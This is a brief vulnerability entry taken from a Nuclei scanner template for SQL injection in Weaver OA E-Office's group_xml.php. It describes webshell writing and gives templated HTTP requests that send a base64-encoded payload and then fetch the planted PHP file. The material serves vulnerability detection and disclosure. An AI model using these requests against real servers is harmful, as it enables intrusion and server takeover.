# Vulnerability: OA E-Office group_xml.php - SQL Injection
**Classification:** WEAVER
**Source:** Nuclei Template (`weaver-group-xml-sqli.yaml`)

## Description
There is a SQL injection vulnerability in the Panwei OA E-Office group_xml.php file. Through the vulnerability, an attacker can write to the Webshell file to obtain server permissions.

## Vulnerable Code Pattern / Exploit Payload
```http
GET /inc/group_user_list/group_xml.php?par={{base64(payload)}} HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

GET /{{filename}}.php HTTP/1.1
Host: {{Hostname}}
```

